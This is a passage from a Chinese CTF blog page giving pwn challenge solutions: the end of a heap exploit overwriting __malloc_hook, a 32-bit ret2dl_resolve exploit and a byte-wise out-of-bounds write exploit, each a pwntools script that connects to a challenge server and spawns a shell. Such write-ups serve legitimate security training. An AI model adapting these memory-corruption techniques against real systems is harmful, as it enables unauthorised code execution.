class="line">create(&apos;A&apos;*0x67)</span><br><span class="line">create(&apos;B&apos;*0x80)</span><br><span class="line">create(&apos;B&apos;*0x80)</span><br><span class="line">create(&apos;C&apos;*0x67)</span><br><span class="line">create(&apos;A&apos;*0x20)</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">show(3)</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = data - 3951480</span><br><span class="line">one_gadget = libc_base + 0x4526a</span><br><span class="line">malloc_addr = libc_base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">print hex(libc_base),hex(malloc_addr)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(4)</span><br><span class="line">delete(1)</span><br><span class="line">create(&apos;A&apos;*0x67)</span><br><span class="line">edit(6,p64(malloc_addr-35))</span><br><span class="line">create(&apos;A&apos;*0x67)</span><br><span class="line">create(&apos;c&apos;*0x67)</span><br><span class="line">create(&apos;\x00&apos;*0x67)</span><br><span class="line">edit(9,&apos;d&apos;*19+p64(one_gadget))</span><br><span class="line">p.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="baby-pwn："><a href="#baby-pwn：" class="headerlink" title="baby_pwn："></a>baby_pwn：</h3><p>常规的32位<code>_runtime_dl_resolve</code>，改一改地址就好了。</p>
<h4 id="EXP：-4"><a href="#EXP：-4" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,33865)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=0x080485db</span><br><span class="line">leave_ret=0x08048448</span><br><span class="line">pppr=0x080485d9</span><br><span class="line"></span><br><span class="line">fake_stack_size=0x800</span><br><span class="line">bss=0x804A068</span><br><span class="line">read_plt=0x8048396</span><br><span class="line">read_got=0x804A00C</span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=0x80481DC</span><br><span class="line">dynstr=0x804827C</span><br><span class="line">plt=0x08048380</span><br><span class="line">relplt=0x804833C</span><br><span class="line">rel_offset=bss_stage+28-relplt</span><br><span class="line">fake_sym_addr=bss_stage+36</span><br><span class="line">align=0x10-((fake_sym_addr-dynsym)&amp;0xf) </span><br><span class="line">print &apos;align==&gt;&apos;+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/0x10</span><br><span class="line">print &apos;index==&gt;&apos;+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;8)|0x7</span><br><span class="line">print &apos;r_info==&gt;&apos;+hex(r_info)</span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+16</span><br><span class="line">fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*44</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(pppr)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(bss_stage)</span><br><span class="line">payload+=p32(100)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(bss_stage)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">binsh=&apos;/bin/sh&apos;</span><br><span class="line"></span><br><span class="line">payload=&apos;aaaa&apos;</span><br><span class="line">payload+=p32(plt)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=&apos;aaaa&apos;</span><br><span class="line">payload+=p32(bss_stage+80)</span><br><span class="line">payload+=&apos;aaaa&apos;</span><br><span class="line">payload+=&apos;aaaa&apos;</span><br><span class="line">payload+=fake_raloc</span><br><span class="line">payload+=&apos;a&apos;*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=&apos;system\0&apos;</span><br><span class="line">payload+=&apos;a&apos;*(80-len(payload))</span><br><span class="line">payload+=binsh+&apos;\x00&apos;</span><br><span class="line">payload+=&apos;a&apos;*(100-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="your-pwn："><a href="#your-pwn：" class="headerlink" title="your_pwn："></a>your_pwn：</h3><p>越界读写，但是只能一个字节一个字节写和一个字节一个字节读。先泄漏<code>__libc_start_main</code>再在ret地址处写入<code>one_gadget</code>。</p>
<h4 id="EXP：-5"><a href="#EXP：-5" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&quot;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&quot;,57856)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def sr(index):</span><br><span class="line">    p.recvuntil(&apos;input index\n&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;now value(hex) &apos;)</span><br><span class="line">    return p.recvuntil(&apos;input&apos;)[-8:-6]</span><br><span class="line"></span><br><span class="line">def xsr(index):</span><br><span class="line">    p.recvuntil(&apos;new value\n&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"># 328 --&gt; canary ; 632 --&gt; libc_start_maini ; 344 --&gt; ret</span><br><span class="line">p.recvuntil(&apos;name:&apos;)</span><br><span class="line">p.sendline(&apos;A&apos;)</span><br><span class="line">libc_start = &apos;&apos;</span><br><span class="line">for i in range(8):</span><br><span class="line">    data = sr(632+i)</span><br><span class="line">    libc_start += data+&apos; &apos;</span><br><span class="line">    data = int(&apos;0x&apos;+data,16)</span><br><span class="line">    xsr(data)</span><br><span class="line"></span><br><span class="line">print libc_start</span><br><span class="line">libc_start_addr = raw_input(&apos;input addr:&apos;)</span><br><span class="line">libc_start_addr = int(libc_start_addr,16)-240</span><br><span class="line">libc_base = libc_start_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">one_addr = libc_base + 0x45216</span><br><span class="line">one_addr = hex(one_addr)</span><br><span class="line">print one_addr</span><br><span class="line"></span><br><span class="line">lili = []</span><br><span class="line">for j in range(2,len(one_addr),2) :</span><br><span class="line">    lili.append(int(&apos;0x&apos;+one_addr[j:j+2],16))</span><br><span class="line">lili = lili[::-1]</span><br><span class="line">lili.append(0)</span><br><span class="line">lili.append(0)</span><br><span class="line">print lili</span><br><span class="line"></span><br><span class="line">for a in range(8):</span><br><span class="line">    data = sr(344+a)</span><br><span class="line">    xsr(lili[a])</span><br><span class="line"></span><br><span class="line">for b in range(25):</span><br><span class="line">    data = sr(b)</span><br><span class="line">    data = int(&apos;0x&apos;+data,16)</span><br><span class="line">    xsr(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;do you want continue(yes/no)? \n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;no&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持v1nke</div>
        <ul>
        
          <li class="item">
            <span>微信扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>支付宝扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2019/04/10/Glibc Heap Attack/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2019/05/19/2019*CTF-PWN/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
